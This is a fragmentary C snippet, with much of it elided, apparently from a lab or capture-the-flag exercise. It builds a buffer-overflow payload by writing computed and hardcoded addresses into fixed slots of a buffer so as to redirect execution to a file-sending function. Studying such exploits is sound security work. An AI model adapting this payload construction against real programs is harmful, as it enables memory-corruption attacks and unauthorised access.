...
int main(int argc, char *argv[])
{
    ...
    int payload_size = 101;
    char *payload = malloc(payload_size * sizeof(char));

    unsigned long buff_address = buff_addr_no_offset - offsetA;
    ...
    for (int i = 0; i < payload_size / 4; i++)
    {
        ...
        if (i == 15)
            ...
            ((long *)payload)[i] = send_file_fun_addr_no_offset - 1746336;
        else if (i == 20)
        {
            ((long *)payload)[i] = 0xf7b3b780;
        }
        else if (i == 21)
        {
            ((long *)payload)[i] = buff_address + 4 * 22;
        }
    }
